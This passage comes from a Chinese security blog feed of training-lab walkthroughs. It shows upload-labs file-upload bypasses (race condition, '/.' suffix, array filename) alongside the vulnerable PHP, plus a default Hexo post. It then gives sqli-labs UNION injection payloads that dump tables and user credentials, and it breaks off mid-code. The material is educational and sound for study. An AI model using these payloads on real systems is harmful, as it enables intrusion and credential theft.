loading="lazy"></p><p><strong>PS：之前本地一直竞争不过，然后把电脑弄卡就轻轻松松成功了，就离谱</strong></p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h2><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多<br>不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p><h2 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19-/.绕过"></a>Pass-19-/.绕过</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>move_uploaded_file会忽略掉文件末尾的/.<br>所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php。最后通过文件包含访问</p><p><img src="/2020/11/16/upload-labs/image-20201121164257255.png" alt="image-20201121164257255" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201121164351433.png" alt="image-20201121164351433" loading="lazy"></p><p>后面发现，将保存名字加上**/.**就行了</p><p><img src="/2020/11/16/upload-labs/image-20201121165106847.png" alt="image-20201121165106847" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201121165121863.png" alt="image-20201121165121863" loading="lazy"></p><h2 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20-数组+/.绕过"></a>Pass-20-数组+/.绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//检查MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token comment">//检查文件名</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传成功！"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$file为数组的话，就不用经过explode处理再变成数组，我们直接上传数组的话，增加了我么的控制性。<br>end($file)会经过后缀名检测，所以数组最后一个一定是白名单中的后缀。<br>$file_name = reset($file) . ‘.’ . $file[count($file) - 1];通常$file[count($file) - 1]和end($file)都指向数组最后一个元素，但是在这里如果这样，那么上传上去的将只能是图片,所以我们可以抓包这样修改</p><p><img src="/2020/11/16/upload-labs/image-20201121172723933.png" alt="image-20201121172723933" loading="lazy"></p><p>成功</p><p><img src="/2020/11/16/upload-labs/image-20201121172745188.png" alt="image-20201121172745188" loading="lazy"></p><p>陆陆续续做了几天，upload-labs这个靶场到这来算是完成了，还是学到了挺多东西的，比如文件上传的简单绕过，简单木马的制作等等。</p><p>作者水平不足，有很多写的不好的地方敬请谅解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="upload-labs" scheme="http://www.blog.yln956.top/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://www.blog.yln956.top/tags/upload-labs/"/>
    
    <category term="文件上传" scheme="http://www.blog.yln956.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.blog.yln956.top/2020/11/14/hello-world/"/>
    <id>http://www.blog.yln956.top/2020/11/14/hello-world/</id>
    <published>2020-11-14T05:33:37.585Z</published>
    <updated>2020-12-06T02:24:56.098Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqli_labs1-20</title>
    <link href="http://www.blog.yln956.top/2020/11/06/sqli-labs1-20/"/>
    <id>http://www.blog.yln956.top/2020/11/06/sqli-labs1-20/</id>
    <published>2020-11-06T12:48:13.000Z</published>
    <updated>2020-11-12T20:54:57.989Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs1-20"><a href="#sqli-labs1-20" class="headerlink" title="sqli_labs1-20"></a>sqli_labs1-20</h1><p>学习sql注入前可以去<a href="https://www.runoob.com/sql/sql-tutorial.html">菜鸟教程</a>看看语法</p><p>使用phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。</p><p> 另外– （–空格）在SQL内表示注释，但在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替– ，原因是+在URL被URL编码后会变成空格。</p><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>根据提示，可以知道只是个单引号注入的题目</p><p><img src="/2020/11/06/sqli-labs1-20/image-20201105194103266-1604667081397.png" alt="image-20201105194103266" loading="lazy"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> ?id<span class="token operator">=</span><span class="token number">1</span> 正常回显<span class="token number">2</span> ?id<span class="token operator">=</span><span class="token number">1</span>'显示错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105194954428-1604667081398.png" alt="image-20201105194954428" loading="lazy"></p><p><img src="/2020/11/06/sqli-labs1-20/image-20201105195020393-1604667081398.png" alt="image-20201105195020393" loading="lazy"></p><p>接下来就是常规的联合注入</p><p>使用order by 来测试表的列数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'order by 3--+?id=1'</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105195843033-1604667081398.png" alt="image-20201105195843033" loading="lazy"><br>发现输入4显示错误，说明是三列</p><p>接下来使用联合查询</p><p><img src="/2020/11/06/sqli-labs1-20/image-20201107160953915.png" alt="image-20201107160953915" loading="lazy"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 只是为了保证<span class="token keyword">union</span>前后两个语句的列数相同，id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> 则是为了使前一个查询无返回结果从而返回第二个 <span class="token keyword">select</span> 的查询结果<span class="token punctuation">,</span>只需要将数字替换为相应的想要查询的信息即可<span class="token punctuation">.</span>比如：?id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span>下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105201629084-1604667081398.png" alt="image-20201105201629084" loading="lazy"></p><p><strong>爆表名</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105202757881-1604667081398.png" alt="image-20201105202757881" loading="lazy"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name='</span>users'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105204014145-1604667081398.png" alt="image-20201105204014145" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105203923813-1604667081398.png" alt="image-20201105203923813" loading="lazy"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>根据提示，是整形注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用<span class="token keyword">order</span> <span class="token keyword">by</span>测试，发现有<span class="token number">3</span>列?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+会报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201333439-1604667081398.png" alt="image-20201106201333439" loading="lazy"></p><p><strong>接下来就是使用union联合查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201547214-1604667081398.png" alt="image-20201106201547214" loading="lazy"></p><p>接下来又是熟悉的爆库爆表爆列爆数据了</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201838614-1604667081398.png" alt="image-20201106201838614" loading="lazy"></p><p>得到表security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202414193-1604667081398.png" alt="image-20201106202414193" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202736797-1604667081398.png" alt="image-20201106202736797" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span>?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202955659-1604667081398.png" alt="image-20201106202955659" loading="lazy"></p><p><img src="/2020/11/06/sqli-labs1-20/image-20201106203036404-1604667081398.png" alt="image-20201106203036404" loading="lazy"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>根据提示</p><p>输入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106194645357-1604667081398.png" alt="image-20201106194645357" loading="lazy"></p><p>根据报错，发现是单引号加括号形成的查询语句，</p><p>尝试构造</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106194947946-1604667081398.png" alt="image-20201106194947946" loading="lazy"></p><p>正常回显</p><p>接着就是和less-1一样的步骤</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195226486-1604667081398.png" alt="image-20201106195226486" loading="lazy"></p><p>可以得到数据库名字security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token 